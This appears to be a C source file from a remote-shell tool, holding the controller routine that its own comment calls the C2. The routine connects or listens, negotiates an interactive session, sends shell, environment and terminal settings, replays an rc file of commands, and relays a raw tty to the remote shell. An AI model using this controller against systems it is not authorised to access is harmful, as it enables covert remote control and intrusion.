
#include "common.h"


int do_control(struct io_helper *io, struct configuration_helper *config){


	int i;
	int retval;
	int err_flag;

	struct termios saved_termios_attrs, new_termios_attrs;

	char **exec_envp;

	int buff_len, tmp_len;
	char *buff_head = NULL, *buff_tail;
	char *buff_ptr;

	int io_bytes;

	struct winsize *tty_winsize;

  int rc_fd;
  wordexp_t rc_file_exp;



	buff_len = getpagesize();
	if((buff_head = (char *) calloc(buff_len, sizeof(char))) == NULL){
		fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				buff_len, (int) sizeof(char), \
				strerror(errno));
		return(-1);
	}


	if((tty_winsize = (struct winsize *) calloc(1, sizeof(struct winsize))) == NULL){
		fprintf(stderr, "%s: %d: calloc(1, %d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				(int) sizeof(struct winsize), strerror(errno));
		return(-1);
	}


	if(wordexp(config->rc_file, &rc_file_exp, 0)){
		fprintf(stderr, "%s: %d: wordexp(%s, %lx, 0): %s\r\n", \
				program_invocation_short_name, io->controller, \
				config->rc_file, (unsigned long)  &rc_file_exp, \
				strerror(errno));
		return(-1);
	}

	if(rc_file_exp.we_wordc != 1){
		fprintf(stderr, "%s: %d: Invalid path: %s\r\n", \
				program_invocation_short_name, io->controller, \
				config->rc_file);
		return(-1);
	}

	if(config->bindshell){
		if(init_io_connect(io, config) == -1){
			fprintf(stderr, "%s: %d: init_io_connect(%lx, %lx): %s\r\n", \
					program_invocation_short_name, io->controller, \
					(unsigned long) io, (unsigned long) config, \
					strerror(errno));
			return(-1);
		}
	}else{
		if(init_io_listen(io, config) == -1){
			fprintf(stderr, "%s: %d: init_io_listen(%lx, %lx): %s\r\n", \
					program_invocation_short_name, io->controller, \
					(unsigned long) io, (unsigned long) config, \
					strerror(errno));
			return(-1);
		}
	}


	if(config->verbose){
		printf("Initializing...");
	}


	/*  - Agree on interactive / non-interactive mode. */
	memset(buff_head, 0, buff_len);
	buff_tail = buff_head;
	*(buff_tail++) = (char) APC;
	*(buff_tail++) = (char) config->interactive;
	*(buff_tail) = (char) ST;

	if((io_bytes = io->remote_write(io, buff_head, HANDSHAKE_LEN)) == -1){
		fprintf(stderr, "%s: %d: io->remote_write(%lx, %lx, %d): %s\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, HANDSHAKE_LEN, strerror(errno));
		return(-1);
	}

	if(io_bytes != HANDSHAKE_LEN){
		fprintf(stderr, "%s: %d: io->remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, HANDSHAKE_LEN);
		return(-1);
	}

	memset(buff_head, 0, buff_len);
	buff_tail = buff_head;
	if((io_bytes = io->remote_read(io, buff_tail, HANDSHAKE_LEN)) == -1){
		fprintf(stderr, "%s: %d: io->remote_read(%lx, %lx, %d): %s\r\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_tail, HANDSHAKE_LEN, strerror(errno));
		return(-1);
	}

	if(io_bytes != HANDSHAKE_LEN){
		fprintf(stderr, "%s: %d: io->remote_read(%lx, %lx, %d): Unable to write entire string.\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_tail, HANDSHAKE_LEN);
		return(-1);
	}

	/* Both sides must agree on interaction. If either one opts out, fall back to non-interactive data transfer. */	
	if(!buff_head[1]){
		config->interactive = 0;
	}


	if(!config->interactive){
		retval = broker(io, config);

#ifdef OPENSSL
		if(config->encryption){
			SSL_shutdown(io->ssl);
			SSL_free(io->ssl);
			SSL_CTX_free(io->ctx);
		}
#endif /* OPENSSL */

		return(retval);
	}


	/*  - Send initial shell data. */
	/* If the C2 hasn't been invoked with a specific shell, then let the client choose. */
	/* We will indicated this by sending an empty string for the shell, indicated by APC/ST with */
	/* nothing in between. */
	memset(buff_head, 0, buff_len);
	buff_tail = buff_head;
	*(buff_tail++) = (char) APC;

	tmp_len = 0;
	if(config->shell){
		tmp_len = strlen(config->shell);
		memcpy(buff_tail, config->shell, tmp_len);
	}

	buff_tail += tmp_len;

	*(buff_tail++) = (char) ST;

	if((buff_tail - buff_head) >= buff_len){
		print_error(io, "%s: %d: Environment string too long.\n", program_invocation_short_name, io->controller);
		return(-1);
	}

	tmp_len = strlen(buff_head);
	if((io_bytes = io->remote_write(io, buff_head, tmp_len)) == -1){
		print_error(io, "%s: %d: io->remote_write(%lx, %lx, %d): %s\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, tmp_len, strerror(errno));
		return(-1);
	}

	if(io_bytes != (buff_tail - buff_head)){
		print_error(io, "%s: %d: io->remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, buff_len);
		return(-1);
	}

	/*  - Send initial environment data. */
	tmp_len = strlen(DEFAULT_ENV);
	if((config->env_string = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
		print_error(io, "%s: %d: calloc(strlen(%d, %d)): %s\n", \
				program_invocation_short_name, io->controller, \
				tmp_len + 1, (int) sizeof(char), strerror(errno));
		return(-1);
	}

	memcpy(config->env_string, DEFAULT_ENV, tmp_len);

	if((exec_envp = string_to_vector(config->env_string)) == NULL){
		print_error(io, "%s: %d: string_to_vector(%s): %s\n", \
				program_invocation_short_name, io->controller, \
				config->env_string, strerror(errno));
		return(-1);
	}

	free(config->env_string);

	memset(buff_head, 0, buff_len);
	buff_tail = buff_head;
	*(buff_tail++) = (char) APC;

	for(i = 0; exec_envp[i]; i++){

		if((buff_tail - buff_head) >= buff_len){
			print_error(io, "%s: %d: Environment string too long.\n", \
					program_invocation_short_name, io->controller);
			return(-1);
		}else if(buff_tail != (buff_head + 1)){
			*(buff_tail++) = ' ';
		}

		tmp_len = strlen(exec_envp[i]);
		memcpy(buff_tail, exec_envp[i], tmp_len);

		buff_tail += tmp_len;

		*(buff_tail++) = '=';

		if((buff_ptr = getenv(exec_envp[i])) == NULL){
			fprintf(stderr, "%s: No such environment variable \"%s\". Ignoring.\n", \
					program_invocation_short_name, exec_envp[i]);
		}else{
			tmp_len = strlen(buff_ptr);
			memcpy(buff_tail, buff_ptr, tmp_len);
			buff_tail += tmp_len;
		}
	}

	*(buff_tail++) = (char) ST;

	if((buff_tail - buff_head) >= buff_len){
		print_error(io, "%s: %d: Environment string too long.\n", \
				program_invocation_short_name, io->controller);
		return(-1);
	}

	tmp_len = strlen(buff_head);
	if((io_bytes = io->remote_write(io, buff_head, tmp_len)) == -1){
		print_error(io, "%s: %d: io->remote_write(%lx, %lx, %d): %s\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, tmp_len, strerror(errno));
		return(-1);
	}

	if(io_bytes != (buff_tail - buff_head)){
		print_error(io, "%s: %d: io->remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, buff_len);
		return(-1);
	}


	/*  - Send initial termios data. */
	if(ioctl(STDIN_FILENO, TIOCGWINSZ, tty_winsize) == -1){
		print_error(io, "%s: %d: ioctl(STDIN_FILENO, TIOCGWINSZ, %lx): %s\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) tty_winsize, strerror(errno));
		return(-1);
	}

	memset(buff_head, 0, buff_len);
	buff_tail = buff_head;
	*(buff_tail++) = (char) APC;

	if((retval = snprintf(buff_tail, buff_len - 2, "%hd %hd", \
					tty_winsize->ws_row, tty_winsize->ws_col)) < 0){
		print_error(io, "%s: %d: snprintf(buff_head, buff_len, \"%%hd %%hd\", %hd, %hd): %s\n", \
				program_invocation_short_name, io->controller, \
				tty_winsize->ws_row, tty_winsize->ws_col, strerror(errno));
		return(-1);
	}

	buff_tail += retval;
	*(buff_tail) = (char) ST;

	tmp_len = strlen(buff_head);
	if((io_bytes = io->remote_write(io, buff_head, tmp_len)) == -1){
		print_error(io, "%s: %d: io->remote_write(%lx, %lx, %d): %s\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, tmp_len, strerror(errno));
		return(-1);
	}

	if(io_bytes != tmp_len){
		print_error(io, "%s: %d: io->remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) io, (unsigned long) buff_head, tmp_len);
		return(-1);
	}

	/*  - Set local terminal to raw.  */
	if(tcgetattr(STDIN_FILENO, &saved_termios_attrs) == -1){
		print_error(io, "%s: %d: tcgetattr(STDIN_FILENO, %lx): %s\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) &saved_termios_attrs, strerror(errno));
		return(-1);
	}

	memcpy(&new_termios_attrs, &saved_termios_attrs, sizeof(struct termios));

	new_termios_attrs.c_lflag &= ~(ECHO|ICANON|IEXTEN|ISIG);
	new_termios_attrs.c_iflag &= ~(BRKINT|ICRNL|INPCK|ISTRIP|IXON);
	new_termios_attrs.c_cflag &= ~(CSIZE|PARENB);
	new_termios_attrs.c_cflag |= CS8;
	new_termios_attrs.c_oflag &= ~(OPOST);

	new_termios_attrs.c_cc[VMIN] = 1;
	new_termios_attrs.c_cc[VTIME] = 0;

	if(tcsetattr(STDIN_FILENO, TCSANOW, &new_termios_attrs) == -1){
		print_error(io, "%s: %d: tcsetattr(STDIN_FILENO, TCSANOW, %lx): %s\n", \
				program_invocation_short_name, io->controller, \
				(unsigned long) &new_termios_attrs, strerror(errno));
		return(-1);
	}	

	if(config->verbose){
		printf("\tDone!\r\n\n");
	}


	/*  - Send the commands in the rc file. */

	if((rc_fd = open(rc_file_exp.we_wordv[0], O_RDONLY)) != -1){

		buff_ptr = buff_head;

		while((io_bytes = read(rc_fd, buff_head, buff_len))){
			if(io_bytes == -1){
				print_error(io, "%s: %d: read(%d, %lx, %d): %s\r\n", \
						program_invocation_short_name, io->controller, \
						rc_fd, (unsigned long) buff_head, buff_len, strerror(errno));
				return(-1);
			}
			buff_tail = buff_head + io_bytes;

			while(buff_ptr != buff_tail){
				if((retval = io->remote_write(io, buff_ptr, (buff_tail - buff_ptr))) == -1){
					print_error(io, "%s: %d: io->remote_write(%lx, %lx, %d): %s\r\n", \
							program_invocation_short_name, io->controller, \
							(unsigned long) io, (unsigned long) buff_ptr, (buff_tail - buff_ptr), strerror(errno));
					return(-1);
				}
				buff_ptr += retval;
			}
		}

		close(rc_fd);
	}


	errno = 0;


	/*  - Enter broker() for tty brokering. */
	if(broker(io, config) == -1){
		print_error(io, "%s: %d: broker(%lx, %lx): %s\r\n", \
				program_invocation_short_name, io->controller, (unsigned long) io, \
				(unsigned long) config, \
				strerror(errno));
	}

	err_flag = 0;
	if(errno == ECONNRESET){
		err_flag = errno;
	}

	/*  - Reset local term. */
	tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios_attrs);

	/*  - Exit. */
	if(!err_flag){
		printf("Good-bye!\n");

	}else{
		while((retval = io->remote_read(io, buff_head, buff_len)) > 0){
			write(STDERR_FILENO, buff_head, retval);
		}
	}

#ifdef OPENSSL
	if(config->encryption){
		SSL_shutdown(io->ssl);
		SSL_free(io->ssl);
		SSL_CTX_free(io->ctx);
	}else{
		BIO_free(io->connect);
	}
#endif /* OPENSSL */

	free(buff_head);
	return(0);
}
